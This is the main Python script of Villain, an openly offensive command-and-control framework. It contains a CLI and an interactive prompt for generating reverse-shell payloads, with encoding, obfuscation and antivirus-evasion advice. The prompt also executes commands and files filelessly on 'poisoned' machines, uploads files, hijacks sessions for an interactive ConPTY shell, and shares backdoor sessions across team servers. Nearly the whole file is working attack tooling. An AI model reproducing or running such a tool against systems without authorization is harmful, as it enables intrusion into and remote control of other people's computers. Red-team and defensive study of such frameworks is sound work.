#!/usr/bin/env python3
#
# Author: Panagiotis Chartas (t3l3machus) 
#
# This script is part of the Villain framework: 
# https://github.com/t3l3machus/Villain


import argparse
from subprocess import check_output
from Core.common import *
from Core.settings import Hoaxshell_Settings, Core_Server_Settings, TCP_Sock_Handler_Settings, File_Smuggler_Settings


# -------------- Arguments -------------- #
parser = argparse.ArgumentParser()

parser.add_argument("-p", "--port", action="store", help = "Team server port (default: 6501).", type = int)
parser.add_argument("-x", "--hoax-port", action="store", help = "HoaxShell server port (default: 8080 via http, 443 via https).", type = int)
parser.add_argument("-n", "--netcat-port", action="store", help = "Netcat multi-listener port (default: 4443).", type = int)
parser.add_argument("-f", "--file-smuggler-port", action="store", help = "Http file smuggler server port (default: 8888).", type = int)
parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for HoaxShell https server).")
parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for HoaxShell https server).")
parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")

args = parser.parse_args()

# Parse the bind ports of servers & listeners
Hoaxshell_Settings.certfile = args.certfile
Hoaxshell_Settings.keyfile = args.keyfile
Hoaxshell_Settings.ssl_support = True if (args.certfile and args.keyfile) else False
Hoaxshell_Settings.bind_port = args.hoax_port if args.hoax_port else Hoaxshell_Settings.bind_port

if Hoaxshell_Settings.ssl_support:
	Hoaxshell_Settings.bind_port_ssl = args.hoax_port if args.hoax_port else Hoaxshell_Settings.bind_port_ssl


Core_Server_Settings.bind_port = args.port if args.port else Core_Server_Settings.bind_port
TCP_Sock_Handler_Settings.bind_port = args.netcat_port if args.netcat_port else TCP_Sock_Handler_Settings.bind_port
File_Smuggler_Settings.bind_port = args.file_smuggler_port if args.file_smuggler_port else File_Smuggler_Settings.bind_port

# Check if there are port number conflicts
defined_ports = [Core_Server_Settings.bind_port, TCP_Sock_Handler_Settings.bind_port, File_Smuggler_Settings.bind_port]

if Hoaxshell_Settings.ssl_support:
	defined_ports.append(Hoaxshell_Settings.bind_port_ssl)
else:
	defined_ports.append(Hoaxshell_Settings.bind_port)

if check_list_for_duplicates(defined_ports):
	exit(f'[{DEBUG}] The port number of each server/handler must be different.')


# Import Core	
from Core.villain_core import *


# -------------- Functions & Classes -------------- #

def haxor_print(text, leading_spaces = 0):

	text_chars = list(text)
	current, mutated = '', ''

	for i in range(len(text)):
		
		original = text_chars[i]
		current += original
		mutated += f'\033[1;38;5;82m{text_chars[i].upper()}\033[0m'
		print(f'\r{" " * leading_spaces}{mutated}', end = '')
		sleep(0.05)
		print(f'\r{" " * leading_spaces}{current}', end = '')
		mutated = current

	print(f'\r{" " * leading_spaces}{text}\n')



def print_banner():
	
	print('\r')
	padding = '  '
	
	V = [[' ', '┬', ' ', ' ', '┬'], [' ', '└','┐','┌', '┘'], [' ', ' ','└','┘', ' ']]
	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
	L = [[' ', '┬',' ',' '], [' ', '│',' ', ' '], [' ', '┴','─','┘']]	
	L2 = [['┬',' ',' '], ['│',' ', ' '], ['┴','─','┘']]	
	A = [['┌','─','┐'], ['├','─','┤'], ['┴',' ','┴']]
	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
	N = [[' ', '┌','┐','┌'], [' ', '│','│','│'], [' ', '┘','└','┘']]	

	banner = [V,I,L,L2,A,I,N]
	final = []	
	init_color = 97
	txt_color = init_color
	cl = 0
		
	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		init_color += 1

		if charset < 2: final.append('\n   ')
	
	print(f"   {''.join(final)}{END}")
	haxor_print('Unleashed', 17)
	print_meta()



def print_meta():
	print(f'{META} Created by t3l3machus')
	print(f'{META} Follow on Twitter, HTB, GitHub: @t3l3machus')
	print(f'{META} Thank you!\n')



class PrompHelp:
	
	commands = {
	
		'connect' : {
			'details' : f''' 			
			\rConnect with another instance of Villain (sibling server). Once connected, you will be able to see and interact with foreign shell sessions owned by sibling servers and vice-versa. Multiple sibling servers can be connected at once. The limit of connections depends on the number of active threads a Villain instance can have at once. Read the Usage Guide or check my YouTube channel for details.

			\r {ORANGE}connect <IP> <TEAM_SERVER_PORT>{END}
			''',
			'least_args' : 2,
			'max_args' : 2
		},
				
				
		'generate' : {
			'details' : f''' 		
			\rGenerate a reverse shell command. This function has been redesigned to use payload templates, which you can find in Villain/Core/payload_templates and edit or create your own.
			\r
			\r Main logic:
			\r {ORANGE}generate payload=<OS_TYPE/HANDLER/PAYLOAD_TEMPLATE> lhost=<IP or INTERFACE> [ obfuscate encode ]{END}
			\r
			\r Usage examples:
			\r {ORANGE}generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode{END}
			\r {ORANGE}generate payload=linux/hoaxshell/sh_curl lhost=eth0{END}
			\r
			\r  - The ENCODE and OBFUSCATE keywords are enabled for certain templates and can be used during payload generation. 
			\r  - For info on a particular template, use "generate" with PAYLOAD being the only provided argument.
			\r  - To catch HoaxShell https-based reverse shells you need to start Villain with SSL.
			\r  - Ultimately, one should edit the templates and add obfuscated versions of the commands for AV evasion.
			''',
			'least_args' : 0, # Intentionally set to 0 so that the Payload_Generator class can inform users about missing arguments
			'max_args' : 7
		},			


		'exec' : {
			'details' : f''' 			
			\rExecute a command or file against an active backdoor session. Files are executed by being http requested from the Http File Smuggler. The feature works regardless if the session is owned by you or a sibling server.
			\r	
			\r {ORANGE}exec <COMMAND or LOCAL FILE PATH> <SESSION ID or ALIAS>{END}
			\r
			\r *Command(s) should be quoted.
			''',
			'least_args' : 2,
			'max_args' : 2
		},			


		'repair' : {
			'details' : f''' 			
			\rUse this command to manually correct a backdoor session's hostname/username value, in case Villain does not interpret the information correctly when the session is established.
			\r 	
			\r {ORANGE}repair <SESSION ID or ALIAS> <HOSTNAME or USERNAME> <NEW VALUE>{END}
			''',
			'least_args' : 3,
			'max_args' : 3
		},	
			
		'shell' : {
			'details' : f''' 			
			\rEnables an interactive pseudo-shell prompt for a backdoor session. Press Ctrl+C to disable.
			\r 
			\r {ORANGE}shell <SESSION ID or ALIAS>{END}
			''',
			'least_args' : 1,
			'max_args' : 1
		},			

			
		'alias' : {
			'details' : f'''
			\rSet an alias for a backdoor session to use instead of session ID.
			\r
			\r {ORANGE}alias <ALIAS> <SESSION ID>{END}
			''',
			'least_args' : 2,
			'max_args' : 2
		},			

			
		'reset' : {
			'details' : f'''
			\rReset a given alias to the original session ID.
			\r
			\r {ORANGE}reset <ALIAS>{END}
			''',
			'least_args' : 1,
			'max_args' : 1
		},			

		
		'kill' : {
			'details' : f'''
			\rTerminate a self-owned backdoor session.
			\r
			\r {ORANGE}kill <SESSION ID or ALIAS>{END}
			''',
			'least_args' : 1,
			'max_args' : 1
		},		

		
		'help' : {
			'details' : f'''
			\rReally?
			''',
			'least_args' : 0,
			'max_args' : 1
		},

		'siblings' : {
			'details' : f'''
			\rPrint info about connected Sibling Servers. 
			\rSiblings are basically other instances of Villain that you are connected with.
			''',
			'least_args' : 0,
			'max_args' : 0
		},

		'threads' : {
			'details' : f'''
			\rVillain creates a lot of threads to be able to handle multiple backdoor sessions, connections with siblings and more. In file Villain/Core/settings.py there is a BoundedSemaphore that works as a thread limiter to prevent resource contention, set by default to 100 (you can of course change it). This command lists the active threads created by Villain, to give you an idea of what is happening in the background, what is the current value of the thread limiter etc.
			\r  
			\rNote that, if the thread limiter reaches 0, weird things will start happening as new threads (e.g. backdoor sessions) will be queued until: thread limiter > 0. 
			''',
			'least_args' : 0,
			'max_args' : 0
		},

		'sessions' : {
			'details' : f'''
			\rPrints info about active backdoor shell sessions.
			''',
			'least_args' : 0,
			'max_args' : 0
		},

		'backdoors' : {
			'details' : f'''
			\rPrints specifics about the shell and listener types of active backdoor shell sessions.
			''',
			'least_args' : 0,
			'max_args' : 0
		},

		'sockets' : {
			'details' : f'''
			\rPrints Villain related socket services info.
			''',
			'least_args' : 0,
			'max_args' : 0
		},

		'id' : {
			'details' : f'''
			\rPrint server's unique ID.
			''',
			'least_args' : 0,
			'max_args' : 0
		},

		'upload' : {
			'details' : f'''
			\rUpload files to a poisoned machine (files are auto-requested from the http file smuggler). The feature works regardless if the session is owned by you or a sibling server. You can run the command from Villain's main prompt as well as the pseudo shell terminal.
			\r
			\r From the main prompt:
			\r {ORANGE}upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH> <SESSION ID or ALIAS>{END}
			\r
			\r From an active pseudo shell prompt:
			\r {ORANGE}upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH>{END}
			''',
			'least_args' : 3,
			'max_args' : 3
		},

		'cmdinspector' : {
			'details' : f'''
			\rVillain has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). 
			\rUse the cmdinspector command to turn that feature on/off. 
			\r
			\r {ORANGE}cmdinspector <ON / OFF>{END}
			''',
			'least_args' : 1,
			'max_args' : 1
		},

		'conptyshell' : {
			'details' : f'''
			\rAutomatically slaps Invoke-ConPtyShell to a backdoor session. A new terminal window with netcat listening will pop up (you need to have gnome-terminal installed) and the script will be executed on the target as a new process, meaning you get a fully interactive shell AND you get to keep your backdoor. Currently works only for powershell.exe backdoors.
			\rBecause I love Invoke-ConPtyShell.
			\r
			\r Usage: 
			\r {ORANGE}conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>{END}
			\r
			''',
			'least_args' : 3,
			'max_args' : 3
		},


		'exit' : {
			'details' : f'''
			\rKill all sessions and quit.
			''',
			'least_args' : 0,
			'max_args' : 0
		},

		'clear' : {
			'details' : f'''
			\rCome on man.
			''',
			'least_args' : 0,
			'max_args' : 0
		},
	
	}
	
	
	@staticmethod
	def print_main_help_msg():
				
		print(
		f'''
		\r  Command              Description
		\r  -------              -----------
		\r  help         [+]     Print this message.
		\r  connect      [+]     Connect with a sibling server.
		\r  generate     [+]     Generate backdoor payload.
		\r  siblings             Print sibling servers data table.
		\r  sessions             Print established backdoor sessions data table.
		\r  backdoors            Print established backdoor types data table.
		\r  sockets              Print Villain related running services' info.
		\r  shell        [+]     Enable an interactive pseudo-shell for a session.
		\r  exec         [+]     Execute command/file against a session.
		\r  upload       [+]     Upload files to a backdoor session.
		\r  alias        [+]     Set an alias for a shell session.
		\r  reset        [+]     Reset alias back to the session's unique ID.
		\r  kill         [+]     Terminate an established backdoor session.
		\r  conptyshell  [+]     Slap Invoke-ConPtyShell against a backdoor session.
		\r  repair       [+]     Manually correct a session's hostname/username info.
		\r  id                   Print server's unique ID (Self).
		\r  cmdinspector [+]     Turn Session Defender on/off.
		\r  threads              Print information regarding active threads.
		\r  clear                Clear screen.
		\r  exit                 Kill all sessions and quit.
		\r  
		\r  Commands starting with "#" are interpreted as messages and will be 
		\r  broadcasted to all connected Sibling Servers (chat).
		\r
        \r  Commands with [+] may require additional arguments.
        \r  For details use: {ORANGE}help <COMMAND>{END}
		''')
			


	@staticmethod
	def print_detailed(cmd):			
		print(PrompHelp.commands[cmd]['details']) if cmd in PrompHelp.commands.keys() else print(f'No details for command "{cmd}".')



	@staticmethod
	def validate(cmd, num_of_args):
		
		valid = True
		
		if cmd not in PrompHelp.commands.keys():
			print('Unknown command.')
			valid = False
			
		elif num_of_args < PrompHelp.commands[cmd]['least_args']:
			print('Missing arguments.')
			valid = False
		
		elif num_of_args > PrompHelp.commands[cmd]['max_args']:
			print('Too many arguments. Use "help <COMMAND>" for details.')
			valid = False			
	
		return valid

	

def alias_sanitizer(word, _min = 2, _max = 26):
	
	length = len(word)
	
	if length >= _min and length <= _max:
	
		valid = ascii_uppercase + ascii_lowercase + '-_' + digits
		
		for char in word:		
			if char not in valid:
				return [f'Alias includes illegal character: "{char}".']
		
		return word
				
	else:
		return ['Alias length must be between 2 to 26 characters.']


	
# Tab Auto-Completer          
class Completer(object):
	
	def __init__(self):
		
		self.tab_counter = 0		
		self.main_prompt_commands = clone_dict_keys(PrompHelp.commands)
		self.generate_arguments = ['payload', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
		'exec_outfile', 'domain']
		self.payload_templates_root = os.path.dirname(os.path.abspath(__file__)) + f'{os.sep}Core{os.sep}payload_templates'
	
	
	
	def reset_counter(self):	
		sleep(0.4)
		self.tab_counter = 0
		
	
	
	def get_possible_cmds(self, cmd_frag):
		
		matches = []
		
		for cmd in self.main_prompt_commands:
			if re.match(f"^{cmd_frag}", cmd):
				matches.append(cmd)
		
		return matches
		
		
		
	def get_match_from_list(self, cmd_frag, wordlist):
		
		matches = []
		
		for w in wordlist:
			if re.match(f"^{cmd_frag}", w):
				matches.append(w)
		
		if len(matches) == 1:
			return matches[0]
		
		elif len(matches) > 1:
			
			char_count = 0
			
			while True:
				char_count += 1
				new_search_term_len = (len(cmd_frag) + char_count)
				new_word_frag = matches[0][0:new_search_term_len]
				unique = []
				
				for m in matches:
					
					if re.match(f"^{new_word_frag}", m):
						unique.append(m)		
				
				if len(unique) < len(matches):
					
					if self.tab_counter <= 1:
						return new_word_frag[0:-1]
						
					else:						
						print('\n')
						print_columns(matches)
						Main_prompt.rst_prompt()
						return False 
				
				elif len(unique) == 1:
					return False
				
				else:
					continue
					
		else:
			return False



	def find_common_prefix(self, strings):
		
		if not strings:
			return ""

		prefix = ""
		shortest_string = min(strings, key=len)

		for i, c in enumerate(shortest_string):

			if all(s[i] == c for s in strings):
				prefix += c
			else:
				break
		
		return prefix



	def path_autocompleter(self, root, search_term, hide_py_extensions = False):
			
			# Check if root or subdir
			path_level = search_term.split(os.sep)
			
			if re.search(os.sep, search_term) and len(path_level) > 1:
				search_term	= path_level[-1]
				
				for i in range(0, len(path_level)-1):
					root += f'{os.sep}{path_level[i]}'
				
			dirs = next(os.walk(root))[1]
			match = [d + os.sep for d in dirs if re.match(f'^{re.escape(search_term)}', d)]
			
			if hide_py_extensions:

				if '__pycache__/' in match:
					match.remove('__pycache__/')

			files = next(os.walk(root))[2]
			match += [f for f in files if re.match(f'^{re.escape(search_term)}', f)]
			
			# Hide extensions
			if hide_py_extensions:
			
				for i in range(0, len(match)):
					if match[i].count('.'):
						match[i] = match[i].rsplit('.', 1)[0]
					

			# Appending match substring 
			typed = len(search_term)
			
			if len(match) == 1:				
				global_readline.insert_text(match[0][typed:])				
				self.tab_counter = 0
			else:				
				common_prefix = self.find_common_prefix(match)
				global_readline.insert_text(common_prefix[typed:])
				
			# Print all matches
			if len(match) > 1 and self.tab_counter > 1:
				print('\n')	
				print_columns(match)
				self.tab_counter = 0
				Main_prompt.rst_prompt()

				


	def update_prompt(self, typed, new_content, lower = False):
		global_readline.insert_text(new_content[typed:])		
	
	
	
	def complete(self, text, state):
		
		text_cursor_position = global_readline.get_endidx()
		self.tab_counter += 1
		line_buffer_val_full = global_readline.get_line_buffer().strip()
		line_buffer_val = line_buffer_val_full[0:text_cursor_position]
		#line_buffer_remains = line_buffer_val_full[text_cursor_position:]
		line_buffer_list = re.sub(' +', ' ', line_buffer_val).split(' ')
		line_buffer_list_len = len(line_buffer_list) if line_buffer_list != [''] else 0
		
		# Return no input or input already matches a command
		if (line_buffer_list_len == 0):
			return
			
		main_cmd = line_buffer_list[0].lower()
		
		# Get prompt command from word fragment
		if line_buffer_list_len == 1:
					
			match = self.get_match_from_list(main_cmd, self.main_prompt_commands)
			self.update_prompt(len(line_buffer_list[0]), match) if match else chill()
		
		
		# Autocomplete session IDs
		elif (main_cmd in ['exec', 'alias', 'kill', 'shell', 'repair', 'upload', 'conptyshell']) and \
			(line_buffer_list_len > 1) and (line_buffer_list[-1][0] not in ["/", "~"]):
			
			if line_buffer_list[-1] in (Sessions_Manager.active_sessions.keys()):
				pass
			
			else:
				
				# Autofill session id if only one active session
				# if Sessions_Manager.active_sessions:

				# 	id_already_set = any(re.search(id, line_buffer_val) for id in Sessions_Manager.active_sessions.keys())

				# 	if not id_already_set:
				# 		if (main_cmd in ['kill', 'shell']):
				# 			session_id = list(Sessions_Manager.active_sessions.keys())[0]
				# 			self.update_prompt(len(line_buffer_list[-1]), session_id)

				# else:
				word_frag = line_buffer_list[-1]
				match = self.get_match_from_list(line_buffer_list[-1], list(Sessions_Manager.active_sessions.keys()) + Sessions_Manager.aliases)
				self.update_prompt(len(line_buffer_list[-1]), match) if match else chill()



		# Autocomplete aliases for reset
		elif (main_cmd in ['reset']) and (line_buffer_list_len > 1) and \
			(line_buffer_list[-1][0] not in ["/", "~"]):
			
			if line_buffer_list[-1] in (Sessions_Manager.aliases):
				pass
			
			else:
				word_frag = line_buffer_list[-1]
				match = self.get_match_from_list(line_buffer_list[-1], list(Sessions_Manager.aliases))
				self.update_prompt(len(line_buffer_list[-1]), match) if match else chill()



		# Autocomplete generate prompt command arguments
		elif (main_cmd == 'generate') and (line_buffer_list_len > 1):
									
			word_frag = line_buffer_list[-1].lower()

			if re.search('payload=[\w\/\\\]{0,}', word_frag):
				
				tmp = word_frag.split('=')

				if tmp[1]:

					root = self.payload_templates_root			
					search_term = tmp[1]
					self.path_autocompleter(root, search_term, hide_py_extensions = True)

				else:
					pass

			else:
				match = self.get_match_from_list(line_buffer_list[-1], self.generate_arguments)
				self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else chill()


		# Autocomplete help
		elif (main_cmd == 'help') and (line_buffer_list_len > 1):
									
			word_frag = line_buffer_list[-1].lower()
			match = self.get_match_from_list(line_buffer_list[-1], self.main_prompt_commands)
			self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else chill()

		
		# Autocomplete paths
		
		elif (main_cmd in ['exec', 'upload']) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] in [os.sep, "~"]):
			
			root = os.sep if (line_buffer_list[-1][0] == os.sep) else os.path.expanduser('~')
			search_term = line_buffer_list[-1] if (line_buffer_list[-1][0] != '~') else line_buffer_list[-1].replace('~', os.sep)
			self.path_autocompleter(root, search_term)
			
		# Reset tab counter after 0.5s of inactivity
		Thread(name="reset_counter", target=self.reset_counter).start()
		return


	
def main():

	chill() if args.quiet else print_banner()
	current_wd = os.path.dirname(os.path.abspath(__file__))
	
	''' Update utility '''
	if args.update:

		updated = False

		try:

			print(f'[{INFO}] Pulling changes from the master branch...')
			u = check_output(f'cd {current_wd}&&git pull https://github.com/t3l3machus/Villain main', shell = True).decode('utf-8')

			if re.search('Updating', u):
				print(f'[{INFO}] Update completed! Please, restart Villain.')
				updated = True

			elif re.search('Already up to date', u):
				print(f'[{INFO}] Already running the latest version!')
				pass

			else:
				print(f'[{FAILED}] Something went wrong. Are you running Villain from your local git repository?')
				print(f'[{DEBUG}] Consider running "git pull https://github.com/t3l3machus/Villain main" inside the project\'s directory.')

		except:
			print(f'[{FAILED}] Update failed. Consider running "git pull https://github.com/t3l3machus/Villain main" inside the project\'s directory.')

		if updated:
			sys.exit(0)
	

	# Initialize essential services
	print(f'[{INFO}] Initializing required services:')

	''' Init Core '''
	core = Core_Server()
	core_server = Thread(target = core.initiate, args = (), name = 'team_server')
	core_server.daemon = True
	core_server.start()
	
	# Wait for the Core server socket to be established
	timeout_start = time()

	while time() < (timeout_start + 5):

		if core.core_initialized:													
			break
		
		elif core.core_initialized == False:			
			sys.exit(1)
			
	else:
		sys.exit(1)


	''' Init Netcat '''
	netcat = TCP_Sock_Multi_Handler()
	nc_multi_listener = Thread(target = netcat.initiate_nc_listener, args = (), name = 'nc_tcp_socket_server')
	nc_multi_listener.daemon = True
	nc_multi_listener.start()

	# Wait for the Netcat multi listener socket to be established
	timeout_start = time()

	while time() < (timeout_start + 5):

		if netcat.listener_initialized:													
			break
		
		elif netcat.listener_initialized == False:			
			sys.exit(1)
			
	else:
		sys.exit(1)
	
	
	''' Init Hoaxshell Engine '''
	initiate_hoax_server()
	payload_engine = Payload_Generator()
	sessions_manager = Sessions_Manager()
	Hoaxshell.server_unique_id = core.return_server_uniq_id()


	''' Init File Smuggler '''
	file_smuggler = File_Smuggler()
		

	''' Start tab autoComplete '''
	comp = Completer()
	global_readline.set_completer_delims(' \t\n;')
	global_readline.parse_and_bind("tab: complete")
	global_readline.set_completer(comp.complete)			
		
	
	''' +---------[ Command prompt ]---------+ '''
	while True:
		
		try:	
			
			if Main_prompt.ready:
								
				user_input = input(Main_prompt.prompt).strip()

				if user_input == '':
					continue
				
				# Check if input is a chat message
				if user_input[0] == '#':

					if core.sibling_servers.keys():
						Core_Server.broadcast(user_input[1:], 'global_chat')
						print(f'\r[{INFO}] Message broadcasted.')

					else:
						print(f'\r[{INFO}] You are currently not connected with other sibling servers.')
					
					continue


				# Handle single/double quoted arguments
				quoted_args_single = re.findall("'{1}[\s\S]*'{1}", user_input)
				quoted_args_double = re.findall('"{1}[\s\S]*"{1}', user_input)
				quoted_args = quoted_args_single + quoted_args_double
				
				if len(quoted_args):
					
					for arg in quoted_args:
						space_escaped = arg.replace(' ', Main_prompt.SPACE)
						
						if (space_escaped[0] == "'" and space_escaped[-1] == "'") or (space_escaped[0] == '"' and space_escaped[-1] == '"'):
							space_escaped = space_escaped[1:-1]
													
						user_input = user_input.replace(arg, space_escaped)
						
				
				# Create cmd-line args list
				user_input = user_input.split(' ')
				cmd_list = [w.replace(Main_prompt.SPACE, ' ') for w in user_input if w]
				cmd_list_len = len(cmd_list)
				cmd = cmd_list[0].lower() if cmd_list else ''
				
				if cmd in core.requests.keys():
					core.requests[cmd] = True
					continue
				
				# Validate number of args
				valid = PrompHelp.validate(cmd, (cmd_list_len - 1))				
									
				if not valid:
					continue


				if cmd == 'help':					
					if cmd_list_len == 1:
						PrompHelp.print_main_help_msg()
										
					elif cmd_list_len == 2:
						PrompHelp.print_detailed(cmd_list[1]) if cmd_list[1] in PrompHelp.commands.keys() \
						else print(f'Command {cmd_list[1] if len(cmd_list[1]) <= 10 else f"{cmd_list[1][0:4]}..{cmd_list[1][-4:]}" } does not exist.')
														
		

				elif cmd == 'id':
					print(f'{BOLD}Server unique id{END}: {ORANGE}{core.return_server_uniq_id()}{END}')



				elif cmd == 'connect':
					core.connect_with_sibling_server(cmd_list[1], cmd_list[2])
					
								

				elif cmd == 'generate':								
					payload_engine.generate_payload(cmd_list[1:])
								


				elif cmd == 'kill':
					session_id = sessions_manager.alias_to_session_id(cmd_list[1])
					
					if not session_id:
						print('Failed to interpret session_id.')
						continue	
														
					sessions_manager.kill_session(session_id)

						

				elif cmd == 'exec':
									
					if Sessions_Manager.active_sessions.keys():
						
						try:

							Main_prompt.ready = False
							Main_prompt.exec_active = True
							execution_object = cmd_list[1]
							session_id = cmd_list[2]
							is_file = False
							shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
							
							if execution_object[0] in [os.sep, '~']:
								
								file_path = os.path.expanduser(execution_object)
								is_file = True if os.path.isfile(file_path) else False
								
								try:

									if is_file:
										execution_object = get_file_contents(file_path, 'r')
										if execution_object in [None, False, '']: 
											raise										
									else:
										raise
										
								except:
									print(f'\r[{ERR}] Failed to read file {file_path}.')
									Main_prompt.ready = True
									continue

							if not is_file and execution_object.lower() == 'exit':
								print(f'\r[{INFO}] The proper way to terminate a session is by using the "kill <SESSION ID>" prompt command.')
								Main_prompt.ready = True
								continue

							if not is_file:
								# Invoke Session Defender to inspect the command for dangerous input
								dangerous_input_detected = False

								if Session_Defender.is_active:
									dangerous_input_detected = Session_Defender.inspect_command(Sessions_Manager.active_sessions[session_id]['OS Type'], execution_object)

								if dangerous_input_detected:
									Session_Defender.print_warning()
									Main_prompt.ready = True
									continue	

							# Check if session id has alias
							session_id = sessions_manager.alias_to_session_id(session_id)
							
							if not session_id:
								print(f'\r[{ERR}] Failed to interpret session_id.')
								Main_prompt.ready = True
								continue								
							
							# If file, check if shell type is supported for exec
							if shell_type not in ['unix', 'powershell.exe']:
								print(f'\r[{INFO}] Script execution not supported for shell type: {shell_type}')
								Main_prompt.ready = True
								continue								

							# Check if any sibling server has an active pseudo shell on that session
							shell_occupied = core.is_shell_session_occupied(session_id)

							if not shell_occupied:
								# Check the session's stability and warn user
								approved = True

								if Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Unstable':
									choice = input(f'\r[{WARN}] This session is unstable. Running I/O-intensive commands may cause it to hang. Proceed? [y/n]:')
									approved = True if choice.lower().strip() in ['yes', 'y'] else False

								if approved:
									# Check who is the owner of the shell session
									session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')
									
									if session_owner_id == core.return_server_uniq_id():
										File_Smuggler.fileless_exec(execution_object, session_id, issuer = 'self') if is_file \
											else Hoaxshell.command_pool[session_id].append(execution_object)
									
									else:
										core.send_receive_one_encrypted(session_owner_id, [execution_object, session_id], 'exec_file') if is_file \
											else Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, execution_object)
								else:
									Main_prompt.ready = True
									continue										

							else:
								print(f'\r[{INFO}] This session is currently being used by a sibling server.')
								Main_prompt.ready = True
								continue									
							
							# Reset prompt if session status is Undefined or Lost 
							if Sessions_Manager.active_sessions[session_id]['Status'] in ['Undefined', 'Lost']:
								Main_prompt.ready = True
							
						except KeyboardInterrupt:
							Main_prompt.ready = True
							continue

					else:
						print(f'\r[{INFO}] No active session.')		

						

				elif cmd == 'shell':
						
					if Sessions_Manager.active_sessions.keys():
						
						Main_prompt.ready = False	
						session_id = Sessions_Manager.alias_to_session_id(cmd_list[1])
						
						if not session_id:
							print('Failed to interpret session_id.')
							Main_prompt.ready = True
							continue

						shell_occupied = core.is_shell_session_occupied(session_id)

						if not shell_occupied:					
							os_type = sessions_manager.active_sessions[session_id]['OS Type']
							Hoaxshell.activate_pseudo_shell_session(session_id, os_type)
							
						else:
							print(f'\r[{INFO}] This session is currently being used by a sibling server.')
							Main_prompt.ready = True
							continue
						
					else:
						print(f'\r[{INFO}] No active session.')		


			
				elif cmd == 'alias':
										
					sessions = Sessions_Manager.active_sessions.keys()
					
					if len(sessions):
						
						if cmd_list[2] in sessions:
							
							alias = alias_sanitizer(cmd_list[1]).strip()
							
							if isinstance(alias, list):
								print(alias[0])
								
							else:
								# Check if alias is unique
								unique = True
								
								for session_id in sessions:
									if Sessions_Manager.active_sessions[session_id]['alias'] == alias.strip():
										unique = False
										break
								
								# Check if alias is a reserved keyword
								is_reserved = False
								
								if alias in ['Undefined', 'Active', 'Stable', 'Unstable']:
									is_reserved = True
								
								# Check if alias is the id of another session	
								is_session_id = False
								
								if alias in sessions:
									is_session_id = True
									
								if unique and not is_session_id and not is_reserved:
									Sessions_Manager.active_sessions[cmd_list[2]]['alias'] = alias.strip()
									Sessions_Manager.active_sessions[cmd_list[2]]['aliased'] = True
									Sessions_Manager.aliases.append(alias)
								
								else:
									print('Illegal alias value.')
						else:
							print('Invalid session ID.')
					else:
						print(f'\rNo active sessions.')		



				elif cmd == 'repair':

					session_id = Sessions_Manager.alias_to_session_id(cmd_list[1])
					
					if not session_id:
						print('Failed to interpret session_id.')
						Main_prompt.ready = True
						continue

					sessions_check = Sessions_Manager.sessions_check(cmd_list[1])
					
					if sessions_check[0]:

						key = cmd_list[2].lower().strip()
						
						if key in ['hostname', 'username']:
							
							result = sessions_manager.repair(cmd_list[1], key, cmd_list[3])
							
							if isinstance(result, list):
								print(result[0])
								
							elif result == 0:
								print('Success.')
							
						else:
							print(f'Repair function not applicable on "{key}". Try HOSTNAME or USERNAME.')

					else:
						print(sessions_check[1])							



				elif cmd == 'reset':

					alias = cmd_list[1]					
					sid = Sessions_Manager.alias_to_session_id(alias)
					
					if sid == alias:
						print('Unrecognized alias.')
					
					elif sid in Sessions_Manager.active_sessions.keys():
						Sessions_Manager.active_sessions[sid]['aliased'] = False
						Sessions_Manager.active_sessions[sid]['alias'] = None
						Sessions_Manager.aliases.remove(alias)
						print(f'Alias for session {sid} successfully reset.')
						
					else:
						print('Unrecognized alias.')



				elif cmd == 'clear':
					os.system('clear')



				elif cmd == 'exit':
					raise KeyboardInterrupt



				elif cmd == 'sessions':							
					sessions_manager.list_sessions()



				elif cmd == 'backdoors':										
					sessions_manager.list_backdoors()


				elif cmd == 'sockets':	
					print_running_services_info()				


				elif cmd == 'siblings':										
					core.list_siblings()


				elif cmd == 'threads':										
					print(f'\nThread limiter value: {Threading_params.thread_limiter._value}')
					threads = enumerate_threads()
					thread_names = []

					print(f"Active threads ({len(threads)}):\n")
					for thread in threads:
						thread_names.append(thread.name)

					print_columns(thread_names)


				elif cmd == 'upload':

					Main_prompt.ready = False
					file_path = os.path.expanduser(cmd_list[1])

					# Check if session id has alias
					session_id = sessions_manager.alias_to_session_id(cmd_list[3])
					
					if not session_id:
						print('Failed to interpret session_id.')
						Main_prompt.ready = True
						continue	

					sessions_check = Sessions_Manager.sessions_check(session_id)
					
					if sessions_check[0]:							

						# Check if file exists
						if os.path.isfile(file_path):
							
							# Get file contents
							file_contents = get_file_contents(file_path)

							if file_contents:
								
								# Check if any sibling server has an active pseudo shell on that session
								shell_occupied = core.is_shell_session_occupied(session_id)

								if not shell_occupied:	
									# Check who is the owner of the shell session
									session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')
								
									if session_owner_id == core.return_server_uniq_id():
										File_Smuggler.upload_file(file_contents, cmd_list[2], session_id)
									
									else:		
										core.send_receive_one_encrypted(session_owner_id, [file_contents, cmd_list[2], session_id], 'upload_file')

								else:
									print(f'\r[{INFO}] The session is currently being used by a sibling server.')
									Main_prompt.ready = True
									continue	
									

						else:
							print(f'\r[{ERR}] File {file_path} not found.')
							Main_prompt.ready = True

